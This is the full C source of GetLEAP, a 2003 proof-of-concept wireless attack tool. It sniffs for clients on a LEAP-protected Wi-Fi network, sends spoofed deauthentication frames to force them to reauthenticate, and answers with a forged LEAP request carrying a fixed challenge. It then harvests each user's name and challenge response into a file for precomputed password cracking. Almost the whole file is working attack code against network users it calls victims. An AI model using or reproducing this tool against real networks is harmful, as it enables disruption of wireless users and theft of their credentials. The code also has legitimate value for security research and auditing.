/* -------------------------------------------------------------------------------------------------------

	GetLEAP - bad coded by DeX7er '03 (dexter@thc.org) , based on Airjack tools and File2air sources
	
	See -h for usage. This code is POC and comes without any warranty, use it on your own risk.
	
	Dependencies: 	- libpcap > Vers. 0.8  
				- airjack wireless card driver (tested ver.0.6.6b)
				- PrismII-based wless card
				
	compile: gcc prg.c -I. -L. -lpcap -o prg
 
----------------------------------------------------------------------------------------------------------

	License:
	--------
	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

-----------------------------------------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <net/bpf.h>
#include <time.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <errno.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <linux/wireless.h>
#include <fcntl.h>
#include <signal.h>
#include <termios.h>
#include <getopt.h>	
#include <pcap.h>
#include <airjack.h>		// struct aj_config

#define	MONITOR_ENABLE		1 
#define	MONITOR_DISABLE		0
#define DEFAULTCHANNEL		6
#define DEFAULTNIC			"aj0"
#define ALLOWED_CHARS		" abcdefghijklmnopqrstuvwxyz����ABCDEFGHIJKLMNOPQRSTUVWXYZ���1234567890-+!?._/"

// tcpdump filter for pcap
#define WLESS_DATAFRAMES	"ether[0] & 0xff == 0x08 and ether[1] & 0xff == 0x01"
#define WLESS_PROBE_REQUEST	"ether[0] & 0xff == 0x40"
#define WLESS_EAP_RESP_ID   "ether[0] & 0xff == 0x08 and ether[0x20] & 0xffff == 0x0001 and ether[0x24] & 0xff == 0x02 and ether[0x28] & 0xff == 0x01"
#define WLESS_EAP_RESP_LEAP	"ether[0] & 0xff == 0x08 and ether[0x20] & 0xffff == 0x0001 and ether[0x24] & 0xff == 0x02 and ether[0x25] & 0xff == 0x01 and ether[0x28] & 0xff == 0x11"
																																		 //         0x5f 				
#define PKT_OFFSET_SRCADDR1 	0x0a
#define PKT_OFFSET_SRCADDR2 	0x10

#define FRAMEREPLAY				1

// Errornumbers
#define PCAP_INIT_FAILED 	1000

//#define DEBUGMONITOR
#define DEBUGSENDPKT

struct MACLIST { 	struct MACLIST *prev;
					u_char MAC[6];
					struct MACLIST *next;
};	

// Globals
static struct termios new_io;
static struct termios old_io;

u_char pcaperrbuf[PCAP_ERRBUF_SIZE];
u_char srcmac[6]; 											// Src MAC
u_char apmac[6]  = { 0x00, 0x0b, 0xbe, 0x6d, 0x8e, 0x77 }; 	// AP Src MAC
u_char seqnum = 0x00; 						  				// Sequence Number
u_char username[32];
u_char challenge[8] = { 0xde,0xad,0xde,0xad,0xde,0xad,0xde,0xad }; // default challenge
u_char challenge_response[24];
u_int userlen;
pcap_t *handle;
char *PrgName;
struct bpf_program pcapFilter; 			/* Define a struct for the filter org (must be defined before bpf_u_int...)*/ 
bpf_u_int32 mask;						/* Our netmask */
bpf_u_int32 net;						/* Our IP */	
u_char *alphabet = ALLOWED_CHARS;
u_int alphalength;

// Prototypes
int aj_getsocket(u_char *ifname);
int aj_getconfig(u_char *ifname, struct aj_config *ajconf);
int aj_setconfig(u_char *ifname, struct aj_config *ajconf);
int aj_setmonitor(u_char *ifname, __u8 rfmonset);
int aj_setchannel(u_char *ifname, __u8 channel);
int aj_sendpkt(u_char *ifname, u_char *buffer, u_int buflen);
int pcap_init(u_char *ifname, u_char *filter_app, void *pcap_packethandler);
void packethandler1(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet);
void packethandler2(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet);	
void packethandler3(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet);
void printhex(u_char *bs, u_int n);
void printconfig(struct aj_config *ajconf);
void errorhandler(u_int errornumber);
int StrToHex(unsigned char *cpString, unsigned int nSizeString,unsigned char *cpHexValue,unsigned int uSizeHexValue );
int checkinput(u_char *alphabet, u_int alphalength, u_char *input, u_int inputlen);
int checkmac(struct MACLIST *maclist, u_char *mac);
struct MACLIST *macadd(struct MACLIST *maclist, u_char *mac);
struct MACLIST *macdec(struct MACLIST *maclist);
void pcapbreak(int sig);
int cbreak(int fd);
int getch();
void reset_card(u_char *ifname);
void usage();

// Main Function
int main(int argc,char *argv[]) {
	
	__u8  channel = DEFAULTCHANNEL;
	__u32 n,o;
	__u32 pcapret = 0;
	u_char c;
	u_char apset=0;
	u_char *filename=NULL;
	FILE *fpFilename;
	u_char macset=0;
	u_char reset=0;
	int countchars=0;
	
	PrgName = argv[0];
	alphalength = strlen(alphabet);
	
	u_char *ifname = DEFAULTNIC;
	u_char deauth[] = { 0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 }; 
		
	u_char eap_req_leap[] = {  0x08,0x02,0xa2,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
							  ,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x9e,0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e
							  ,0x01,0x00,0x00,0x18,0x01,0x01,0x00,0x18,0x11,0x01,0x00,0x08,0x00,0x00,0x00,0x00
							  ,0x00,0x00,0x00,0x00 }; // 0x5f = ID, must be the same like in the pcap-filter above	
	u_char *eap_req_leap_pkt;
							  
	struct aj_config oldconf;
		
	struct USERS { 	u_char username[32];
					u_char MAC[6];
					u_char challenge[8];
					u_char challengeresp[24];
					struct USERS *next;
	};

	struct USERS *usersfirst;
	struct USERS *users;
		
	struct MACLIST *maclist = (struct MACLIST *) malloc(sizeof(struct MACLIST));
	if(maclist == NULL) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }	
	struct MACLIST *maclist_first; 
	maclist_first = maclist;
	
	users = (struct USERS *) malloc(sizeof(struct USERS));
	if(users == NULL) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }	
	usersfirst = users;
	
	// parse command line
	while((o = getopt(argc, argv, "c:i:a:k:f:m:h-?")) != EOF)
    {      
        switch (o)
        {
			case 'c':
				channel = atoi(optarg);
				break;
			case 'i':
				if(strlen(optarg) < 20) { // should be enough for an Interface name
					if(checkinput(alphabet, alphalength, optarg, strlen(optarg)) == EXIT_SUCCESS) {
						ifname = optarg;
						break;
					}
				}
				else {
					printf("Error: Wrong format for -i parameter\n");
					exit(EXIT_FAILURE);
				}
			case 'a':
				countchars = StrToHex(optarg,strlen(optarg),apmac,6);
				if(countchars == 6) {
					apset=1;
					break;
				}
				else {
					printf("Error: AP MAC must have 6 bytes length\n");
					exit(EXIT_FAILURE);
				}
			case 'k':
				countchars = StrToHex(optarg,strlen(optarg),challenge,8);
				if(countchars == 8) break;
				else {
					printf("Error: Challenge must have 8 bytes length\n");
					exit(EXIT_FAILURE);
				}
			case 'f':
				if(checkinput(alphabet, alphalength, optarg, strlen(optarg)) == EXIT_SUCCESS) {
					filename = optarg;
					break;
				}
				else {
					printf("Error: Wrong filename format\n");
					exit(EXIT_FAILURE);
				}
			case 'm':
				countchars = StrToHex(optarg,strlen(optarg),srcmac,6);
				if(countchars == 6) {
					macset = 1;
					break;
				}
				else {
					printf("Error: Victims MAC must have 6 bytes length\n");
					exit(EXIT_FAILURE);
				}
			default:
				usage();
		}
	}
	
	if(apset!=1) { printf("\nError: AP Mac not set\n\n"); usage(); }
	
	printf("AP MAC    : ");printhex(apmac,6);printf("\n");
	printf("Challenge : ");printhex(challenge,8);printf("\n");
	
	aj_getconfig(ifname,&oldconf); // save old config	
		
	aj_setchannel(ifname,channel);	// set channel
	
	reset_card(ifname); // set into RFMON
	
	printf("Interface %s set to channel %d and into RFMON\n",ifname,channel);		
	
	maclist = macadd(maclist, apmac);
	
	while(1) {
		if(!macset) { // search for victims 
			printf("(Re)starting loop\n");
			//c = ' ';
			memcpy(srcmac,apmac,6); // reset srcmac value tp apmac
			while(checkmac(maclist_first,srcmac)) { // we are not interested in packets from the AP (only users)	
				if((pcapret = pcap_init(ifname, WLESS_DATAFRAMES,packethandler1)) == -2) break;
			}
			// CTRL-C hit ?
			if(pcapret == -2) {
				printf("Exit or continue (e/c)? ");
				while( ( (c = getch() ) != 'e') && ( c != 'c') );
				printf("\n");
				if(c == 'c') continue; // restart
		
				break; // exit
			}
			
			printf("\nNew Victim found ! MAC = "); printhex(srcmac,6); 
			
			// should we attack this host
			printf("\n%s", (reset == 0) ? "Reset is off\n" : "Reset is on\n");
			printf("(c)ontinue, continue and toggle (r)eset flag or (s)kip this MAC (c/r/s)? "); 
			while( ( (c = getch() ) != 'c') && ( c != 's') && ( c != 'r') );
			printf("\n");
			if(c == 's') {
				maclist = macadd(maclist, srcmac); // add MAC to already seen MACs List
				continue;
			}
			if(c == 'r') {
				reset = (reset == 0) ? 1 : 0; // toggle reset flag
				printf("%s", (reset == 0) ? "Reset is off\n" : "Reset is on\n");
				if(reset) { 
					reset_card(ifname);
					printf("Interface reseted\n");
				}
			}
			// yes, continue 
			maclist = macadd(maclist, srcmac); // add MAC to already seen MACs List
		}			
		
		memcpy(users->MAC,srcmac,6); // cp sniffed MAC into Userlist
		memcpy(deauth+4,srcmac,6); // cp victim src into deauth-pkt
		memcpy(deauth+10,apmac,6); // cp AP MAC into deauth-pkt
		memcpy(deauth+16,apmac,6); // cp BSSID into deauth-pkt
		
		// send deauthentication frame and force the user to reauthenticate
		for(n=0; n < FRAMEREPLAY; n++) {
			aj_sendpkt(ifname,deauth,sizeof(deauth));
		}
		printf("\n%d Deauthentication pkt(s) sent! Waiting for EAP Response Id frame ...\n",n);	
		
		// pcap init: wait for the EAP Response Identity frame from the user...
		pcapret = pcap_init(ifname, WLESS_EAP_RESP_ID,packethandler2);
		// CTRL-C hit ?
		if(pcapret == -2) {
			printf("Exit or continue (e/c) ? ");
			while( ( (c = getch() ) != 'e') && ( c != 'c') );
			printf("\n");
			if(c == 'c') { 
				maclist = macdec(maclist); 
				continue; // restart
			}
			break; // exit
		}
		printf("\nEAP Response Id frame received. Username: %s\n",username);
		
		// construct EAP Request LEAP pkt
		memcpy(eap_req_leap+4,srcmac,6); // cp victim src into deauth-pkt
		memcpy(eap_req_leap+10,apmac,6); // cp AP MAC into deauth-pkt
		memcpy(eap_req_leap+16,apmac,6); // cp BSSID into deauth-pkt
		eap_req_leap_pkt = malloc(sizeof(eap_req_leap)+userlen);
		if(eap_req_leap_pkt == NULL) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }
		memcpy(eap_req_leap_pkt,eap_req_leap,sizeof(eap_req_leap));   // cp main part of packet
		memcpy(eap_req_leap_pkt+(sizeof(eap_req_leap)-8),challenge,8); // cp challenge into pkt
		memcpy(eap_req_leap_pkt+sizeof(eap_req_leap),username,userlen); // cp username into pkt
		
		if(reset) { 
			reset_card(ifname);
			printf("Interface reseted\n");
		}
		
		// sent it
		for(n=0; n < FRAMEREPLAY; n++) {
			aj_sendpkt(ifname,eap_req_leap_pkt,sizeof(eap_req_leap)+userlen);
		}
		printf("\n%d EAP Request LEAP pkt(s) sent. Waiting on EAP Response LEAP frame ...\n",n);
		
		// pcap init: wait for the EAP Response LEAP frame from the user...
		pcapret = pcap_init(ifname, WLESS_EAP_RESP_LEAP,packethandler3);
		// CTRL-C hit ?
		if(pcapret == -2) {
			printf("Exit or continue (e/c) ?");
			while( ( (c = getch() ) != 'e') && ( c != 'c') );
			printf("\n");
			if(c == 'c') { 
				maclist = macdec(maclist); 
				continue; // restart
			}
			break; // exit
		}
		printf("\nEAP Response LEAP frame received. \nNtChallengeResponse: ");printhex(challenge_response,24);printf("\n\n");
		
		// Fill our userlist
		strncpy(users->username,username,sizeof(users->username));
		users->username[sizeof(users->username)-1] = '\0';
		memcpy(users->challenge,challenge,8);
		memcpy(users->challengeresp,challenge_response,24);
		
		users->next = malloc(sizeof(struct USERS));
		if(users->next == NULL) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }
		users = users->next;  
		users->next = NULL;
		
		if(macset) break;
	}
	
	// show what we have collected
	printf("\nCollected Data:\n");
	printf("-------------------------------------------------------------------------------------------\n");
	users = usersfirst;
	while(users->next != NULL) {
		printf("\nUsername          : %s\n",users->username);
		printf("MAC               : "); printhex(users->MAC,6); printf("\n");
		printf("Challenge         : "); printhex(users->challenge,8); printf("\n");
		printf("Challenge Response: "); printhex(users->challengeresp,24); printf("\n");
		
		// should we save the results to a file ?
		if(filename != NULL) {
			printf("Saving data to file: %s\n",filename);
			if((fpFilename = fopen(filename, "a")) == NULL ) { printf("\nError: File error\n\n"); usage(); }
			fprintf(fpFilename,"%s ",users->username);
			for(n=0; n < 8; n++) { fprintf(fpFilename,"%02x",users->challenge[n]); } fprintf(fpFilename," ");
			for(n=0; n < 24; n++) { fprintf(fpFilename,"%02x",users->challengeresp[n]); } fprintf(fpFilename,"\n");
			fclose(fpFilename);
		}
		
		users = users->next;
	}
	
	// restore interface config 
	aj_setconfig(ifname,&oldconf);	
	printf("Old settings of %s restored. Good bye.\n",ifname);
	
	exit(EXIT_SUCCESS);	
}

/* aj_getsocket accepts the AirJack interface char * and 
   return a socket, or -1 on error.  This is cribbed right from essid_jack.c,
   thanks Abaddon. */
int aj_getsocket(u_char *ifname) {

    struct sockaddr_ll	addr;
    struct ifreq	req;
    struct aj_config	aj_conf;
    int    sock;

    /* open the link layer socket */
    if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        return(-1);
    }

    /* get the interface index */
    memset(&req, 0, sizeof(struct ifreq));
    memset(&aj_conf, 0, sizeof(struct aj_config));
    strncpy(req.ifr_name, ifname,sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0';

    if(ioctl(sock, SIOCGIFINDEX, &req) < 0) {
        close(sock);
        return(-1);
    }

    /* bind the socket to the interface */
    memset(&addr, 0, sizeof(struct sockaddr_ll));
    addr.sll_ifindex = req.ifr_ifindex;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_family = AF_PACKET;
    if(bind(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll)) < 0) {
        close(sock);
        return(-1);
    }

    return(sock);
}

int aj_getconfig(u_char *ifname, struct aj_config *ajconf) {
	struct ifreq req;
    int sock;

    if((sock = aj_getsocket(ifname)) < 0) {
        perror("aj_getsocket");
        close(sock);
        return(-1);
    }

    req.ifr_data = (char *)ajconf;
    strncpy(req.ifr_name, ifname, sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0'; 

    /* populate the structure */
    if (ioctl(sock, SIOCAJGMODE, &req) < 0) {
        close(sock); 
        return(-1);
    }
	
	return(0);
}

int aj_setconfig(u_char *ifname, struct aj_config *ajconf) {
	struct ifreq req;
    int sock;
	
    if((sock = aj_getsocket(ifname)) < 0) {
        perror("aj_getsocket");
        close(sock);
        return(-1);
    }

    req.ifr_data = (char *)ajconf;
    strncpy(req.ifr_name, ifname, sizeof(req.ifr_name));
	req.ifr_name[sizeof(req.ifr_name)-1] = '\0';
	
	// set struct ajconf
	if (ioctl(sock, SIOCAJSMODE, &req) < 0) {
        close(sock); 
        return(-1); 
    }
	
	
	#ifdef DEBUGMONITOR 
	printconfig(ajconf);
	#endif
	
	return(0); 
	
}
int aj_setchannel(u_char *ifname, __u8 channel) {
	struct aj_config ajconf;

	// init ajconf
    aj_getconfig(ifname,&ajconf);
	
	// set channel
	ajconf.channel = channel;
	
	// set ajconf
    aj_setconfig(ifname,&ajconf);
	
	return(0);
}

/* aj_setmonitor sets or disables RFMON mode for AirJack interfaces */
int aj_setmonitor(u_char *ifname, __u8 rfmonset) {

    struct aj_config ajconf;

    // init ajconf
    aj_getconfig(ifname,&ajconf);
	
	// set monitor mode 0=off 1=on
	ajconf.monitor = rfmonset;
	
	// set ajconf
    aj_setconfig(ifname,&ajconf);

    return(0);

}

int aj_sendpkt(u_char *ifname, u_char *buffer, u_int buflen) {
	
	int	sock;
	
	#ifdef DEBUGSENDPKT
	//printf("Buffer len: %d\nBuffer    : ",buflen);
	//printhex(buffer,buflen);printf("\n");
	#endif
	
	/* Get a socket to send the frames with */
	if ((sock = aj_getsocket(ifname)) < 0) {
			perror("aj_getsocket");
			exit(-1);
	}
	
	if (write(sock, (__u8 *)buffer, buflen) < buflen) {
            perror("write");
            exit(-1);
    }
	printf(">");
	
	/* Close the packet-writing socket */
	close(sock);
	
	return(EXIT_SUCCESS);
};

int pcap_init(u_char *ifname, u_char *filter_app, void *pcap_packethandler)
{
	// use changed signal handler routine for CTRL-C to abort pkt processing
	struct sigaction act;
	act.sa_handler = pcapbreak;
	sigemptyset(&act.sa_mask);
	sigaction(SIGINT, &act,0);
	
	int ret;
	
	// should we init pcap with or without a tcpdump packet filter
	if(filter_app != NULL) 
	{
		/* Find the properties for the device */
		pcap_lookupnet (ifname, &net, &mask, pcaperrbuf);		
		
		/* open handle */
		handle = pcap_open_live (ifname, BUFSIZ, 1, 0, pcaperrbuf);  
		if(handle == NULL) { 
			printf("libpcap-error: %s\n",pcaperrbuf); 
			exit(1); 
		}
		
		/* compile the filter expression */
		if((pcap_compile(handle, &pcapFilter, filter_app,0,net)) == -1) { 
			printf("libpcap-error: %s\n",pcap_geterr(handle)); 
			exit(1); 
		} 
		pcap_setfilter(handle, &pcapFilter); 					/* Apply the filter */
		pcap_freecode(&pcapFilter);
	}
	else 
	{	
		printf("Without a filter\n");
		
		static bpf_u_int32 mask;	/* Our netmask */
		static bpf_u_int32 net;		/* Our IP */
		
		pcap_lookupnet (ifname, &net, &mask, pcaperrbuf);		/* Find the properties for the device */
		
		handle = pcap_open_live (ifname, BUFSIZ, 1, 0, pcaperrbuf); /* open handle */ 
		if(handle == NULL) errorhandler(PCAP_INIT_FAILED);
	}
	
	ret = pcap_loop(handle,1,pcap_packethandler,NULL);
	pcap_close (handle);
	
	// restore default signal handler
	act.sa_handler = SIG_DFL;
	sigemptyset(&act.sa_mask);
	sigaction(SIGINT, &act,0);	
		
	return(ret); // return -2 if user hit CTRL-C
	
}

void packethandler1(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	// get the source mac of the pkt
	putchar('<');
	fflush(stdout);
	
	// a basic test for corrupted pkts
	if(pkthdr->len < PKT_OFFSET_SRCADDR2+6) {
		printf("Pkt too short. Pktlength : %d\n",pkthdr->len);
		exit(EXIT_FAILURE);
	}
	
	if((*(packet+1) & 0x0f) == 0x01) {
		//printf("Frame is entering DS (0x01)\n");
		memcpy(srcmac,packet+PKT_OFFSET_SRCADDR1,6);
	}
	if((*(packet+1) & 0x0f) == 0x02) {
		//printf("Frame is exiting DS (0x02)\n");
		memcpy(srcmac,packet+PKT_OFFSET_SRCADDR2,6);
	}
}

void packethandler2(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	// save the username
	putchar('<');
	fflush(stdout);
	
	// a basic test for corrupted pkts
	if(pkthdr->len < 0x26+2) {
		printf("Pkt too short. Pktlength : %d\n",pkthdr->len);
		exit(EXIT_FAILURE);
	}
	
	userlen = ntohs(*(short *) (packet+0x26))-5;
	if(userlen < 32) {
		// a basic test for corrupted pkts
		if(pkthdr->len < 0x29+userlen) {
			printf("Pkt too short. Pktlength : %d\n",pkthdr->len);
			exit(EXIT_FAILURE);
		}
		if (checkinput(alphabet, alphalength, (char *) packet+0x29, userlen) == EXIT_SUCCESS) {
			memcpy(username,packet+0x29,userlen);
			username[userlen] = '\0'; // just for sure	
		}
		else {
			printf("Error: Username has illegal characters\n");
			exit(0);
		}
	}
	else {
		printf("Error: No Username found\n");
		exit(0);
	}
}

void packethandler3(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	// save the NtChallengeResponse
	putchar('<');
	fflush(stdout);
	memcpy(challenge_response,packet+0x2c,24);
}

void printhex(u_char *bs, u_int n) {
	
	u_int i;
	
	for(i=0; i < n; i++) {
		printf("%02x ",bs[i]);
	}
}

void printconfig(struct aj_config *ajconf) {

	printf("Mode   : %04x \n"  ,ajconf->mode);
	printf("MAC    : "); printhex(ajconf->ownmac,6);printf("\n");
	printf("Monitor: %02x \n",ajconf->monitor);
	printf("Channel: %02x \n",ajconf->channel);
	printf("ESSID  : "); printhex(ajconf->essid,33);printf("\n");
	
}

void errorhandler(u_int errornumber) {
	printf("Error number: %d\n", errornumber);
	exit(EXIT_FAILURE);
}

// String to Hex Conversion
int StrToHex(unsigned char *cpString, unsigned int nSizeString,unsigned char *cpHexValue,unsigned int uSizeHexValue ) 
{
int i,x,y,count=0;
unsigned char hex[nSizeString];
		
x = 0;
y = 0;	
	
for (i = 0;i < nSizeString; i++)
	{
		switch ( cpString[i] )
		{
			case '0' :
				hex[i] = 0;
				count++;
				break;
			case '1' :
				hex[i] = 1;
				count++;
				break;
			case '2' :
				hex[i] = 2;
				count++;
				break;
			case '3' :
				hex[i] = 3;
				count++;
				break;
			case '4' :
				hex[i] = 4;
				count++;
				break;
			case '5' :
				hex[i] = 5;
				count++;
				break;
			case '6' :
				hex[i] = 6;
				count++;
				break;
			case '7' :
				hex[i] = 7;
				count++;
				break;
			case '8' :
				hex[i] = 8;
				count++;
				break;
			case '9' :
				hex[i] = 9;
				count++;
				break;			
			case 'a' :
			case 'A' :
				hex[i] = 0x0A;
				count++;
				break;
			case 'b' :
			case 'B' :
				hex[i] = 0x0B;
				count++;
				break;
			case 'c' :
			case 'C' :
				hex[i] = 0x0C;
				count++;
				break;
			case 'd' :
			case 'D' :
				hex[i] = 0x0D;
				count++;
				break;
			case 'e' :
			case 'E' :
				hex[i] = 0x0E;
				count++;
				break;
			case 'f' :
			case 'F' :
				hex[i] = 0x0F;
				count++;
				break;
			case ' ' :
			case '-' :
			case '\t':
			case ':' :
				continue;
			default:
				printf("\nError: %c is not a hexvalue \n\n",cpString[i]);
				exit(EXIT_FAILURE);
		}
		
		if (x % 2) // every odd value (1,3,5,..) 
			{
			if ( y >= uSizeHexValue ) { printf("\nError: Buffer too small \n\n"); exit(EXIT_FAILURE); }  	// Protect Buffer				
			cpHexValue[y] = hex[i] | (hex[i-1]<<4);	// last low nibble OR with high nibble (shift to high)
			y++;
			}
		x++;
	}
	
	return(count/2);
}

int checkmac(struct MACLIST *maclist, u_char *mac) {
	
	u_int ret=0;
	
	while(maclist->next != NULL) {
		if(!memcmp(maclist->MAC,mac,6)) ret += 1;
		maclist = maclist->next;
	}
	
	return(ret);
}

struct MACLIST *macadd(struct MACLIST *maclist, u_char *mac) {
	
	memcpy(maclist->MAC,mac,6);
	maclist->next = (struct MACLIST *) malloc(sizeof(struct MACLIST));
	if(maclist->next == NULL) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }
	maclist->next->prev = maclist;
	maclist = maclist->next; 
	maclist->next = NULL;
	
	return(maclist);
}

struct MACLIST *macdec(struct MACLIST *maclist) {

	maclist = maclist->prev;
	maclist->next = NULL;
	free(maclist->next);
	return(maclist);
}

void pcapbreak(int sig) {
	printf("\nAborting ...\n\n");
	pcap_breakloop(handle);	
}

int cbreak(int fd) {
	if((tcgetattr(fd, &old_io)) ==  -1) return(-1);
	
	new_io  = old_io;
	new_io.c_lflag = new_io.c_lflag & ~(ECHO|ICANON);
	new_io.c_cc[VMIN]  = 1;
	new_io.c_cc[VTIME] = 0;

	if((tcsetattr(fd, TCSAFLUSH, &new_io)) ==  -1) return(-1);
	return(1);
}

int getch() {
	int c;
	
	if(cbreak(STDIN_FILENO) == -1) {
		printf("\nError in cbreak.\n");
		tcsetattr(STDIN_FILENO, TCSANOW, &old_io);
		exit(0);
	}
	
	c = getchar();
	
	tcsetattr(STDIN_FILENO, TCSANOW, &old_io);
	return(c);
}

int checkinput(u_char *alphabet, u_int alphalength, u_char *input, u_int inputlen) {
	
	u_int i;
	u_char *p;
	
	for(i=0; i < inputlen; i++) {
		p = (u_char *) memchr(alphabet,input[i],alphalength);
		if (p == NULL) {
			printf("Error ASCII:0x%02x(%c) not allowed !\n",input[i],input[i]);
			return(EXIT_FAILURE);
		}
	}
	return(EXIT_SUCCESS);
}

void reset_card(u_char *ifname) {
	
		// this is a quick 'n dirty work around of an airjack bug
		// (sometimes aj is not able to sent more than one pkt in monitor mode, it seems to be
		// related to how busy the WLAN is. I'll try to find a better solution in the future ...
		aj_setmonitor(ifname,MONITOR_DISABLE);
		aj_setmonitor(ifname,MONITOR_ENABLE);
}

void usage() {
	printf("\n");
	printf("LEAP Password collector written by DeX7er '03 (dexter@thc.org) Version 0.1      \n");
	printf("You will always get the latest version and other cool stuff at www.thc.org    \n\n");
	printf("This tool needs the AirJack driver by Abaddon (tested ver.0.6.6b).            \n\n");
	printf("It sniffes for active wireless users on the wireless network, it                \n");
	printf("deauthenticates these users to force them to reauthenticate via LEAP.           \n");
	printf("If the user (re)starts the LEAP authentication process, the tool answers this   \n");
	printf("request with the given challenge, so we are able to collect the users           \n");
	printf("NtChallengeResponse with the same challenge for every user. This makes it       \n");
	printf("possible to use pre-compiled password/NtHash Lists for brute force attacks      \n");
	printf("against all users on the network, cause the challenge is the same for every     \n");
	printf("user. \n\n");

	printf("This code is Proof of Concept(POC) and comes without any warranty, use it on    \n");
	printf("your own risk.                                                                \n\n");
	printf("This program is free software; you can redistribute it and/or modify it under   \n");
	printf("the terms of the GNU General Public License as published by the Free Software   \n"); 
	printf("Foundation; either version 2 of the License, or (at your option) any later      \n");
	printf("version.\n\n");
	
	printf("Version: %s (you need min. Ver. 0.8)\n\n", pcap_lib_version());  // cause of a bug in pcap 0.7 (a register leak in function gen_arth() in gencode.c)
																			 // we need at least version 0.8 or we get filter errors
	printf("Usage: %s -a <AP-MAC> [-c <channel>] [-i <interface>] [-k <challenge>]\n[-f <save-filename>] [-m <MAC>]\n\n", PrgName);
	printf("          -a	the APs MAC address\n");
	printf("          -c	wireless channel (default: %d)\n",DEFAULTCHANNEL);
	printf("          -i	wireless card interface (default: %s)\n",DEFAULTNIC);
	printf("          -k	challenge (default: 'deaddeaddeaddead')\n");
	printf("          -f	file to save the collected data to\n");
	printf("          -m    Victims MAC address (we don't search for victims,     \n"); 
	printf("                                     we just attack this one Victim)\n\n");
	
	printf("Depending on the state in which the users wireless card is in the moment, it's \n");
	printf("behavior could be an other than the tool expects, but you can restart, abort   \n");
	printf("or reset the sniffing process at any time with CTRL-C + Option.                \n");
	printf("Due to an bug in AirJack, depending on how busy the WLAN is, it's possible that\n");
	printf("the spoofed packets are not sent out. A workaround is to toggle the reset flag \n");
	printf("(hit Ctrl-C; r) if the state of the application doesn't change for a while.    \n");
	printf("It's recommended to test this in a lab enviroment first. Play with the options \n");
	printf("while you are sniffing to get a feeling for it's behavior.\n\n");
	exit(EXIT_FAILURE);
}
